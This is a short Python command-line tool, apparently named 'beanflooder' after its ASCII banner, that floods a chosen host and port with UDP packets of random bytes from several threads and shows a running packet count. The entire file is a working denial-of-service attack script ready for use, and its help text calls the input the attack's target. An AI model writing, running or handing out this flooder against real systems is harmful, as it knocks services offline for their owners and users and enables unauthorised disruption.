#!/usr/bin/python3

import os
import re
import sys
import time
import shutil
import socket
import random
from threading import Thread
from argparse import ArgumentParser

pack_sent: int = 0
running: bool = True

def print_delim(sym: str = '=') -> None:
    print('='*shutil.get_terminal_size().columns)

def flood(host: str, port: int) -> None:
    global pack_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payl = random._urandom(1024)
    while running:
        sock.sendto(payl, (host,port))
        pack_sent += 1

def main():
    global pack_sent, running

    print_delim()
    print(''' ,,                                             ,...  ,,                            ,,                  
*MM                                           .d' ""`7MM                          `7MM                  
 MM                                           dM`     MM                            MM                  
 MM,dMMb.   .gP"Ya   ,6"Yb.  `7MMpMMMb.      mMMmm    MM  ,pW"Wq.   ,pW"Wq.    ,M""bMM  .gP"Ya `7Mb,od8 
 MM    `Mb ,M'   Yb 8)   MM    MM    MM       MM      MM 6W'   `Wb 6W'   `Wb ,AP    MM ,M'   Yb  MM' "' 
 MM     M8 8M""""""  ,pm9MM    MM    MM mmmmm MM      MM 8M     M8 8M     M8 8MI    MM 8M""""""  MM     
 MM.   ,M9 YM.    , 8M   MM    MM    MM       MM      MM YA.   ,A9 YA.   ,A9 `Mb    MM YM.    ,  MM     
 P^YbmdP'   `Mbmmd' `Moo9^Yo..JMML  JMML.   .JMML.  .JMML.`Ybmd9'   `Ybmd9'   `Wbmd"MML.`Mbmmd'.JMML.   ''')
    print_delim()

    parser = ArgumentParser()
    parser.add_argument('target', type=str, help='The attack\'s target (ip / fqdn) ... ')
    parser.add_argument('port', type=int, help='The target port ... ')
    parser.add_argument('--threads', type=int, help='How many threads to use ... ', default=4)
    args = parser.parse_args()

    host = args.target
    port = args.port

    if not re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', args.target):
        try:
            host = socket.gethostbyname(args.target)
        except socket.gaierror:
            print(f'[-] Couldn\'t resolve hostname "{args.target}" ... ')
            os._exit(1)

    if not 0 <= port <= 2**16:
        print(f'[-] Invalid port {port} ... ')
        os._exit(1)

    ts = []
    for t in range(args.threads):
        ts.append(Thread(target=flood, args=(host,port)))
        ts[-1].start()

    try:
        while True:
            print(f'\r[*] {pack_sent} packets sent ... ', end='')
            time.sleep(0.2)
    except KeyboardInterrupt:
        print()
        print('[*] Interrupted ... Exiting ... ')
        running = False

    for t in ts:
        t.join()
    print('[+] Done! Exiting ... ')

if __name__ == '__main__':
    main()